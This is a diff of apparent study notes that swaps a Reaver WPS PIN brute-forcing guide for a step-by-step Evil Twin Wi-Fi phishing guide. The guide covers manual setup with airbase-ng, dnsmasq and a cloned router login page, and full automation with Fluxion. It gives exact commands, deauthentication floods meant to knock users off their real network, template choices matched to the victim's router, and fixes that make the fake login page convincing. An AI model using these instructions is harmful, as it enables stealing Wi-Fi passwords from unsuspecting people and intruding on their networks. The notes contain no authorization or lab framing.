@@ -1,284 +1,456 @@
-# WPA/WPA2 Cracking - Exploiting WPS
+- Last resort to gain access to a WPA/WPA2 network.
+- Relies on social engineering.
 
-## 1. Quick overview
+Idea:
+1. Start a fack AP with same name as target network.
+2. Disconnect a client.
+3. Wait for them to connect to the fack AP.
+4. Automatically display a page asking for network key.
 
-* **WPA/WPA2**: Wi-Fi encryption using a Pre-Shared Key (PSK).
-* **WPS (Wi-Fi Protected Setup)**: convenience feature (PIN or PBC). The **WPS PIN** (8 digits) can be brute-forced on vulnerable routers to reveal the WPA/WPA2 passphrase.
-* **Key idea**: Reaver exploits WPS PIN vulnerabilities. If WPS is protected (lockouts, patched routers, or PBC-only) the attack may fail.
+Advantaqe - no need for guessing.
+Drawbacks:
+1. User have to connect to open fack AP.
+2. They have to enter their WPA key in a web page.
+
+---
+# 🧠 Evil Twin Attack (Manual & Automatic Using Fluxion)
 
 ---
 
-## 2. Tools (common)
+## 🧩 1. Concept Overview
 
-* `airmon-ng` — put wireless card into monitor mode
-* `wash` — find WPS-enabled APs
-* `reaver` — brute-force WPS PIN (get WPA key if successful)
-* `aireplay-ng` — fake authentication & other packet injections
-* `airodump-ng` / `aircrack-ng` — capture handshakes & offline cracking
-* `pixiewps` — offline Pixie Dust attack (if router vulnerable)
+* When all technical attacks (wordlist, WPS exploit, etc.) fail → **target the users**.
+* The **Evil Twin Attack** tricks users into connecting to a **fake access point (AP)** that looks identical to their real one.
 
 ---
 
-## 3. Typical workflow (step-by-step)
+## ⚙️ 2. Attack Logic
 
-1. **Enable monitor mode**
-
-   * `airmon-ng start wlan0`  → (example interface becomes `mon0`)
-2. **Scan for WPS-enabled APs**
-
-   * `wash -i mon0`
-   * Note BSSID (AP MAC), Channel, SSID, WPS type (PIN/PBC)
-3. **Try Reaver (simple case)**
-
-   * `reaver -i mon0 --bssid <AP_BSSID> -c <channel> -vv`
-4. **If Reaver fails with “failed to associate”**
-
-   * Get your interface MAC: `ifconfig mon0`  (or `ip link show mon0`)
-   * Start fake authentication (keeps you associated):
-
-     ```
-     aireplay-ng --fakeauth 100 -a <AP_MAC> -h <YOUR_MAC> mon0
-     ```
-   * Run Reaver without association:
-
-     ```
-     reaver -i mon0 -b <AP_BSSID> -c <channel> -A
-     ```
-
-     (or `--no-associate -vv` insted of `-A` depending on Reaver version)
-5. **If Reaver stalls or AP locks out**
-
-   * Check verbose logs (`-vv` / `-vvv`) → look for lockout messages or rate-limiting
-   * Try alternatives (Pixie Dust, handshake capture + offline cracking) depending on router behavior
+1. **Create a fake AP** (same SSID as the target Wi-Fi).
+2. **Deauthenticate** all users from the real AP (so they’ll reconnect to yours).
+3. **Host a fake login page** asking for the Wi-Fi password (WPA key).
+4. **Victim enters password → attacker captures it.**
 
 ---
 
-## 4. Troubleshooting checklist
+## 🧠 3. Why It Works
 
-* **“Failed to associate”** → run `aireplay-ng --fakeauth` and use `--no-associate` with Reaver.
-* **Reaver stuck at 0.00% after association** → enable verbose (`-vv`/`-vvv`), check for lockouts or rate-limiting.
-* **AP locks WPS after few tries** → wait for lockout to expire or try Pixie Dust (`pixiewps`) if vulnerable.
-* **AP uses PBC (Push Button)** → cannot brute-force with a PIN. Requires physical/GUI action.
-* **Modern/patched routers** → many are not vulnerable; use handshake capture + offline cracking or lab environment.
+✅ No brute-force needed — the user types the real password.
+✅ Works even with strong passwords.
 
 ---
 
+## ⚠️ 4. Drawbacks / Risks
 
-# 📘  Bypassing Ox3 and Ox4 Errors (If you got this issue)
-
----
-
-## 1. Problem Recap
-
-* In previous steps, we **fixed the association issue** using fake authentication (`aireplay-ng --fakeauth`).
-* After that, Reaver sometimes gets **stuck at 0.00%** — it associates successfully but doesn’t continue trying new PINs.
-* The goal here is to **debug why Reaver is stuck** and learn how to **bypass timeout or NACK-related issues**.
+* Users must connect to an **open (unsecured)** network → may raise suspicion.
+* Login page opens in browser — some may realize it’s fake.
+* More believable on **phones/macOS** (page shown inside a system popup) than on **Windows/Linux** (opens in browser).
 
 ---
 
-## 2. Step 1 — Debug with Verbose Output
+## 📶 5. Difference from Captive Portal Attack
 
-When Reaver doesn’t progress, we need to **see what’s happening in the background**.
-
-### Command:
-
-```
-reaver -i mon0 -b <AP_BSSID> -c <channel> --no-associate -vvv
-```
-
-* `-vvv` → enables **very verbose mode** (shows all background messages).
-* Helps identify **timeouts**, **NACKs**, and **transaction failures**.
-* Use only for debugging (it floods the screen with logs).
+| Captive Portal             | Evil Twin                            |
+| -------------------------- | ------------------------------------ |
+| Users expect login page    | Users don’t expect login page        |
+| Network is open by default | Original WPA/WPA2 network is secured |
+| Easier to fool users       | More suspicious setup                |
 
 ---
 
-## 3. Step 2 — Reading the Verbose Output
+## 🧰 6. Manual Evil Twin Steps
 
-In the debug output, you might see:
+1. **Prepare fake AP:**
 
-* Successful association ✅
-* Reaver trying a PIN (e.g., `00055673`)
-* Then **timeout errors** or **WPS transaction failed** messages ❌
-* Reaver keeps retrying **the same PIN repeatedly** instead of moving forward → this indicates an issue with **NACK (Negative Acknowledgment) packets**.
+   * Same SSID as target.
+   * Open network (no password).
 
-🧠 **Explanation:**
-Reaver sends and receives WPS packets to test PINs.
-Some routers respond with *NACKs* (negative acknowledgments) due to out-of-order or unexpected packets.
-This can trap Reaver in a loop — it retries the same PIN forever and doesn’t make progress.
+2. **Start required services:**
 
----
+   * `airbase-ng` → create fake AP
+   * `dnsmasq` → DNS spoofing
+   * `apache2` → host fake login page
 
-## 4. Step 3 — Check Reaver Help for Options
+3. **Disconnect users** from real AP using deauth attack.
 
-Use this command:
+4. **Fake login page options:**
 
-```
-reaver --help
-```
+   * Create one yourself (HTML form).
+   * Download ready-made template.
+   * Use **router’s admin login page** (most convincing).
 
-You’ll find the option:
+5. **Modify the HTML page:**
 
-```
--N or --no-nacks
-```
+   * Remove username field.
+   * Replace login prompt with:
+     👉 *“Please enter your Wi-Fi password to reconnect.”*
 
-→ **Tells Reaver not to send NACK messages** when it receives out-of-order packets.
+6. **Collect submitted credentials** from web server logs.
 
 ---
 
-## 5. Step 4 — Apply the Fix (Bypass the 0x02 / 0x03 NACK Loop)
+## 🧮 7. How to Get Router Login Page
 
-Re-run Reaver, adding the **--no-nacks** option:
+* Find router IP:
 
-### Fixed Command:
+  ```bash
+  route -n
+  ```
+* Usually → `192.168.1.254` or similar.
+* Open it in browser → copy the HTML login page.
+* Edit it as your fake WPA login prompt.
 
-```
-reaver -i mon0 -b <AP_BSSID> -c <channel> --no-associate --no-nacks -vv
+---
+
+## ⚡ 8. Automating with Fluxion
+
+Instead of doing everything manually, use **Fluxion** — a tool that automates the entire Evil Twin process.
+
+### 🔧 What Fluxion Does Automatically
+
+* Scans for target networks
+* Creates fake AP (same SSID)
+* Launches web server + DNS
+* Displays fake login template
+* Deauthenticates users from real AP
+* Validates password entered by victim
+
+---
+
+## 🧩 9. Installing Fluxion (v2 preferred)
+
+[Fluxion](https://github.com/FluxionNetwork/fluxion.git)
+
+```bash
+cd /opt
+git clone https://github.com/FluxionNetwork/fluxion.git
+cd fluxion/install
+bash install.sh
 ```
 
-✅ **Expected Result:**
-
-* Reaver starts trying **new PINs** instead of repeating the same one.
-* You’ll see different PIN values being tested (e.g., `00055678`, then `01235678`, etc.).
-* Progress percentage begins to increase.
+* Installs dependencies automatically.
+* **Fluxion 2** recommended (more stable, better templates)
+* Fluxion 3 exists but is **buggy** and has fewer templates.
 
 ---
 
-## 6. Step 5 — What We Learned
+## 🚀 10. Running Fluxion
 
-**Main takeaways:**
-
-1. Use `-vvv` (triple verbose) to **debug and understand what’s happening**.
-2. Check `reaver --help` for useful flags that can fix specific issues.
-3. `--no-nacks` (or `-N`) helps bypass **0x02 / 0x03** transaction errors caused by NACK loops.
-4. Always start fresh if previous attempts failed (`Reaver` sometimes stores session data that can interfere).
-
----
-
-# 📘 WPA/WPA2 – Reaver Brute Forcing & Router Locking 
-
----
-
-## 1. How Reaver Brute-Forces WPS PINs
-
-* **WPS PIN** = 8-digit numeric code used for authentication.
-* Reaver systematically tries all possible combinations (~11,000 valid PINs).
-* Works even if the PIN is random, since it’s purely numeric and limited in length.
-
-### Example:
-
-```
-reaver -i mon0 -b <AP_BSSID> -c <channel> -vv
+```bash
+cd /opt/fluxion
+bash fluxion.sh
 ```
 
-* Starts brute-forcing the WPS PIN.
-* Tests each combination until it finds the correct one.
-* Once the correct PIN is found, Reaver calculates and displays the **WPA/WPA2 key**.
+* Follow the guided menu:
+
+  1. Select target network
+  2. Choose attack type → *Fake AP*
+  3. Pick login page template
+  4. Start attack
+
+Fluxion will:
+
+* Create fake AP
+* Deauth real users
+* Show fake login page
+* Capture WPA key entered
+* Verify if password is valid
 
 ---
 
-## 2. Reaver’s Pause and Resume Feature
+## 💡 11. Why Learn Manual First?
 
-* Reaver supports **resuming from where it left off**.
-* You can stop the attack anytime with:
+* You understand how Wi-Fi APs, DHCP, DNS, and web redirects work.
+* You can **adapt the attack** for other use cases (e.g., captive portals).
+* If Fluxion fails or has bugs → you can perform it manually.
+
+✅ **Evil Twin = Social Engineering + Wi-Fi Spoofing**
+⚡ **Fluxion = Automates Everything (but manual knowledge is power!)**
+
+
+--- 
+# 🧠  Using **Fluxion** for an Automatic Evil Twin Attack
+
+---
+
+## ⚙️ 1. Purpose
+
+Fluxion automates the **Evil Twin attack** — it creates a fake Wi-Fi network identical to the target’s and tricks users into entering their WPA/WPA2 password through a fake login page.
+
+---
+
+## 🧩 2. Setup & Launch
+
+### Step 1: Navigate to the tool’s directory
+
+```bash
+cd /opt/fluxion
+```
+
+### Step 2: Run the script
+
+```bash
+bash fluxion.sh
+```
+
+---
+
+## 🌐 3. Configuration Steps (Interactive Setup)
+
+### 🗣️ a. Language
+
+* Select your language (e.g., **1 → English**).
+
+### 📡 b. Channel Scan
+
+* Choose **All Channels (1)** to discover all available networks.
+
+Fluxion will automatically open **Airodump-ng** to list nearby Wi-Fi networks.
+
+### 🎯 c. Select Target
+
+* Find your target (e.g., `UPC Network`)
+* Note its ID and enter that number (e.g., **3**).
+
+---
+
+## 🧱 4. Fake Access Point Creation
+
+Fluxion asks which tool to use:
+
+* **1 → Hostapd** (recommended, stable)
+* **2 → Airbase-ng**
+
+➡️ Choose **1 (Hostapd)** to generate the fake access point.
+
+---
+
+## 🪪 5. Handshake (Verification Step)
+
+Fluxion can:
+
+* Use an existing **.cap** handshake file
+  (e.g., `/root/handshake01.cap`)
+* Or **capture one automatically** if you skip (press *Enter*).
+
+Fluxion verifies the handshake using **Pyrit** or **Aircrack-ng**.
+
+---
+
+## 🔐 6. SSL Certificate
+
+Prompt:
+
+> Create or search for an SSL certificate?
+
+✅ Choose **1 – Create new certificate**
+(to enable HTTPS on the fake login page)
+
+---
+
+## 🧰 7. Web Interface (Login Template)
+
+Fluxion will display available templates:
+
+* Generic (English, French, Arabic, etc.)
+* Router-specific (TP-Link, Netgear, Belkin, Virgin Media, etc.)
+
+👉 Pick the one matching the victim’s router brand for realism.
+
+Example:
+If target router is TP-Link → choose **option 33**.
+
+---
+
+## 🚀 8. Attack Deployment
+
+Fluxion will now:
+
+* Start **fake AP** (same SSID as target)
+* Launch **DHCP & DNS servers**
+* Start **web server** hosting the fake login page
+* Run **deauth attack** to disconnect users from the real AP
+
+Clients lose Wi-Fi connection → reconnect automatically to the fake AP.
+
+---
+
+## 📲 9. Victim Experience
+
+* The victim sees their usual Wi-Fi name (SSID).
+* They connect → a **login page** appears asking for the WPA key.
+* The page may simulate:
+
+  * Router firmware upgrade
+  * Security verification
+  * “Enter your Wi-Fi password to reconnect”
+
+Once entered, Fluxion:
+
+1. Captures the password.
+2. Verifies it against the handshake.
+3. Confirms if it’s valid.
+
+---
+
+## 🧪 10. Example Output
+
+Fluxion confirms successful capture:
+
+```
+Password found: 1234abcd
+Verified using Aircrack-ng
+```
+
+✅ Attack complete — the correct WPA2 key has been obtained.
+
+---
+# 🧠 Fixing Broken Login Pages in **Fluxion** (Relative URL Bug)
+
+---
+
+## ⚙️ 1. Problem Overview
+
+When using **Fluxion**, sometimes the **auto-displayed login page** looks broken or suspicious.
+✅ All other parts of the attack (DHCP, DNS spoofing, HTTPS, web server) work fine.
+❌ Only the *first auto-popup page* fails to load CSS/JS styles.
+
+---
+
+## 🕵️ 2. Root Cause Analysis
+
+* The page loads fine when directly visiting a URL like:
 
   ```
-  Ctrl + C
+  http://example.com/index.html
   ```
-* Later, run Reaver again with the same command. It will:
-
-  * Detect the saved session automatically.
-  * Continue from the last progress (e.g., 50%), **not from scratch**.
-
-### Example:
-
-```
-reaver -i mon0 -b <AP_BSSID> -c <channel> -vv
-```
-
-→ When asked: *"Do you want to continue from the last session?"*
-Type **yes** to resume.
-
----
-
-## 3. Brute Force Speed and Time Estimation
-
-* Reaver estimates **maximum time** to complete all 11,000 PINs.
-* Example output:
+* But it **breaks** when the browser adds folders after the domain:
 
   ```
-  0.7% complete, estimated maximum time: 6 hours 5 minutes
+  http://example.com/fwlink/somepath
   ```
-* The actual time may be **shorter** if the correct PIN is found early.
-* Key takeaway: **WPS brute forcing is realistic** because 11,000 combinations are not a large number.
+
+🧩 **Reason:**
+The login page uses **relative URLs** (e.g., `href="bootstrap.min.css"`) instead of **absolute URLs**.
+
+When the browser sees a relative path, it tries to load the resource *relative to the current directory* (`fwlink/`), which doesn’t exist on the Fluxion web server.
 
 ---
 
-## 4. WPS Locking (Rate Limiting) Explained
+## 🧰 3. Locating the Web Files
 
-### ❗What It Is:
+Fluxion stores all temporary files in `/tmp/fluxion/`.
 
-Some routers **lock their WPS feature** after too many failed PIN attempts.
-Once locked:
+### Navigate to the directory:
 
-* The router **stops responding** to WPS requests.
-* Even the correct PIN will be ignored until it **unlocks**.
-
-### How to Check Lock Status:
-
-Run:
-
-```
-wash -i mon0
+```bash
+cd /tmp/fluxion
 ```
 
-Look for:
+Inside, you’ll find:
 
-```
-WPS Locked: Yes / No
-```
-
-✅ **No** → router still open for attempts
-❌ **Yes** → router locked, must wait or reset
+* Web templates (`index.html`, `check.php`, etc.)
+* Captured data
+* Server configs for **Lighttpd** (not Apache)
 
 ---
 
-## 5. Behavior of Different Routers
+## 🧾 4. Fixing the HTML Code
 
-| Router Type       | Reaction After Failed Attempts | Unlock Time   |
-| ----------------- | ------------------------------ | ------------- |
-| Older Routers     | No lockout                     | Never locks   |
-| Some ISPs Routers | Temporary lockout              | 1–5 minutes   |
-| Newer Routers     | Long-term lockout              | Hours or days |
+1. Open `index.html` (the main login page):
+
+   ```bash
+   sudo nano /tmp/fluxion/data/index.html
+   ```
+
+   *(You can also use Genie or any editor.)*
+
+2. Find **relative paths**:
+
+   ```html
+   <link href="bootstrap.min.css" rel="stylesheet">
+   <script src="main.js"></script>
+   <form action="check.php">
+   ```
+
+3. Add a **forward slash (`/`)** before each path:
+
+   ```html
+   <link href="/bootstrap.min.css" rel="stylesheet">
+   <script src="/main.js"></script>
+   <form action="/check.php">
+   ```
+
+✅ This makes all paths **absolute from the webroot**, ensuring they load correctly regardless of directory.
 
 ---
 
-## 6. Simple Unlock Method (User Interaction Trick)
+## 🧮 5. Batch Fix Using Search & Replace
 
-If WPS gets locked and you can’t continue brute forcing:
+To quickly apply the fix inside your editor:
 
-1. **Force users to restart the router manually.**
+* For **CSS/JS links**:
 
-   * Use a **deauthentication attack** to disconnect all clients repeatedly.
-   * This may make the user notice and **reboot the router**, which resets WPS.
+  * Find: `href="`
+  * Replace with: `href="/`
 
-2. **Command Example:**
+* For **script tags**:
 
-   ```
-   aireplay-ng --deauth 9999999 -a <AP_BSSID> mon0
-   ```
+  * Find: `src="`
+  * Replace with: `src="/`
 
-   * `--deauth` = sends deauthentication packets.
-   * `9999999` = large number of packets (continuous attack).
-   * `-a` = target router MAC address.
-   * `mon0` = interface in monitor mode.
+* For **form actions**:
 
-3. **Wait for router restart**, then re-run Reaver:
+  * Find: `action="`
+  * Replace with: `action="/`
 
-   ```
-   reaver -i mon0 -b <AP_BSSID> -c <channel> -vv
-   ```
+This converts all relative URLs into absolute ones.
 
-⚠️ Note: This method **depends on human reaction**, not a guaranteed unlock.
+---
+
+## 💾 6. Save & Restart
+
+After editing:
+
+```bash
+Ctrl + S  (Save)
+Ctrl + Q  (Quit)
+```
+
+Then restart Fluxion’s web interface or re-run the attack.
+
+---
+
+## ✅ 7. Verification
+
+Reconnect to your **Evil Twin** network:
+
+* The auto-login popup now displays perfectly.
+* Styles and scripts load correctly.
+* The fake router upgrade/login page looks legit.
+
+If the user enters their password → it’s captured and verified instantly by Aircrack-ng.
+
+---
+
+## 💡 8. Takeaways
+
+| Problem                                  | Cause                              | Fix                           |
+| ---------------------------------------- | ---------------------------------- | ----------------------------- |
+| Broken auto-login page                   | Relative URLs                      | Add `/` to make URLs absolute |
+| Files not found                          | Browser looking in wrong directory | Use webroot-based links       |
+| Works on manual visit but not auto-popup | Different URL structure            | Fixed with absolute paths     |
+
+---
+
+## 🧠 Bonus Insight
+
+This bug affects **all Fluxion templates**, not just TP-Link.
+So apply the same fix to any template you use.
+
+---
+
+**Result:**
+✨ The attack now appears professional and convincing — especially on mobile & macOS, where the popup opens in a native window, not a browser.
 
 ---
